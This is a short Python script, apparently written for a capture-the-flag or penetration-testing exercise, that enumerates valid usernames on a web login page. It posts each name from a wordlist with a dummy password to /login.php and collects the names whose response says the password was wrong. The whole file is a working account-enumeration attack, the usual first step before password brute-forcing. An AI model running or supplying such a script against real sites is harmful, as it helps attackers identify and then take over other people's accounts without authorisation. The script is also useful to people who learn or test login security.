import requests, argparse

def username_discoverer():
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", type=str)
    parser.add_argument("-ip", type=str)
    args = parser.parse_args()
    ip_addr ="http://"+ args.ip+"/login.php"
    wordlist = args.w
    success = False
    usernames = []
    try:
        for user in open(wordlist):
            print("Trying user ",user)
            payload ={"username": user.strip(), "password": "whatever"}
            response = requests.post(ip_addr, data = payload)
            if "Wrong password. Please try again" in response.text:  
                success = True
                usernames.append(user.strip())
    except IOError:
        print(wordlist, "not found!")
    if success:
        print("Usernames found:", usernames)
    else:
        print("Username not found :(")
        

if __name__ == "__main__":
  username_discoverer()
